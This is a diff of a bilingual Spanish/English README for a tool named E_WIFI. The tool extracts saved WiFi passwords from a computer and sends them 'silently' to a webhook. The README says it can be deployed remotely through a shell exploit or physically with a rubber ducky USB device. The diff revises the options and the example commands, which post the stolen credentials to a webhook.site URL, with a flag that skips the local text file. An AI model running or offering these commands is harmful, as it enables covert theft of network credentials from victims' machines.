@@ -16,18 +16,15 @@ and also can be used offline, physically (rubber ducky)
 Script para extraer contraseñas WIFI de un pc subiendolo remotamente(shell exploit) y enviarlo a una url "silenciosamente"(webhook) 
 Tambien se puede usar offline, físicamente con un pendrive(rubber ducky)
 
-Usage: E_WIFI.py [OPTIONS]
 
+Usage: E_WIFI.exe [OPTIONS]
 
 Options:
-
   -u, --url TEXT      Webhook/POST URL
-  
-  -o, --only-webhook  Only send data to webhook (whithout creating the txt file) need to specify the url with -u Envía los datos
-                      solo a la webhook (sin crear el archivo txt) necesitas especificar la url con -u
-                      
+  -n, --no-txt        No crea el archivo txt | Doesn't create the txt file
   -v, --version       Imprime la version | Prints the version
-  
+  -p, --print-output  Muestra la salida en la terminal | Shows the output in
+                      the terminal
   --help              Show this message and exit.
   
 
@@ -54,9 +51,10 @@ Crea un txt con los nombres y las contrasenas WIFI guardadas en la maquina local
 
 Another Example
 
-python3 E_WIFI.py -o -u https://webhook.site/yoururl 
-CMD or Powershell E_WIFI.exe | ./E_WIFI.exe -o -u https://webhook.site/yoururl
+python3 E_WIFI.py -u https://webhook.site/yoururl -n -p 
+CMD or Powershell E_WIFI.exe | ./E_WIFI.exe -u https://webhook.site/yoururl -n -p
 
 type --help for more detailed info
 
-PD: Extracciones.txt is the txt with the wifis credentials
+PD: THE TXT IS CREATED BY DEFAULT -n TURN IT OFF
+    EL TXT SE CREA POR DEFECTO -n APAGA LA CREACION
